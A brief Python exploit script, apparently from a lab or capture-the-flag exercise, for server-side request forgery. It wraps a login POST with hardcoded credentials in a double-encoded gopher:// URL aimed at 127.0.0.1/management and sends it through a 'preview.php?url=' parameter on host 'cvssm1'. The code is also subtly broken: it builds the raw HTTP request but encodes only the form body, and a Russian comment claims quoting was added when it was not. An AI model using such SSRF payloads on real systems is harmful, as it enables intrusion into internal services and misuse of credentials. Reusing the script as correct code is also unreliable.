import urllib.parse
import requests

data = "username=librarian&password=L1br4r1AN!!"

http_request = (
    f"POST /management HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(data)}\r\n"
    "\r\n"
    f"{data}"
)

double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))

# Исправлено: добавлен _ после /
gopher_url = f"gopher://127.0.0.1:80/_{double_encoded_data}"
# Исправлено: добавлено квотирование для final_url
final_url = f"http://cvssm1/preview.php?url={gopher_url}"
print(final_url)
response = requests.get(final_url, timeout=10)
print(response.text)